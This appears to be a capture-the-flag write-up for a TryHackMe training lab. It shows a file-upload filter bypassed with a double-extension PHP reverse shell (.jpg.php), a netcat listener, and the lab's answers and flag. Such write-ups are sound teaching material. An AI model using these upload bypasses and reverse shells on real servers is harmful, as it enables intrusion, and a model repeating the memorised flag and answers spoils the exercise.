# TRYHACKME: ADVENTOFCYBER2 - [DAY 2] WEB EXPLOITATION - The Elf Strikes Back!

TOPICS: GET Parameters and URLs, File Uploads, Reverse Shells, Reverse Shell Listeners

```
After your heroic deeds regaining control of the control centre yesterday, Elf McSkidy has decided to give you an important job to do.

"We know we've been hacked, so we need a way to protect ourselves! The dev team have set up a website for the elves to upload pictures of any suspicious people hanging around the factory, but we need to make sure it's secure before we add it to the public network. Please perform a security audit on the new server and make sure it's unhackable!"

You listen to the briefing and accept the task, pressing the deploy button to start the server as you do so.

McSkidy once again gives you a dossier of useful information to help you with your task, which you read as you wait for the server to boot:

Find a file upload point.
Try uploading some innocent files -- what does it accept? (Images, text files, PDFs, etc)
Find the directory containing your uploads.
Try to bypass any filters and upload a reverse shell.
Start a netcat listener to receive the shell
Navigate to the shell in your browser and receive a connection!

At the bottom of the dossier is a sticky note containing the following message:

For Elf McEager:
You have been assigned an ID number for your audit of the system: ODIzODI5MTNiYmYw . Use this to gain access to the upload section of the site.
Good luck!

You note down the ID number and navigate to the displayed IP address (MACHINE_IP) in your browser.
```

### QUESTIONS

What string of text needs adding to the URL to get access to the upload page?

```
?id= ODIzODI5MTNiYmYw
```

What type of file is accepted by the site?

Page source has '<input type=file id="chooseFile" accept=".jpeg, .jpg, .png">'

```
image
```

Bypass the filter and upload a reverse shell.  In which directory are the uploaded files stored?

cp /usr/share/webshells/php/php-reverse-shell.php php-reverrse-shell.jpg.php

```
/uploads/
```

Activate your reverse shell and catch it in a netcat listener!

```
sudo nc -lvnp 443
```

What is the flag in /var/www/flag.txt?

```
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
```
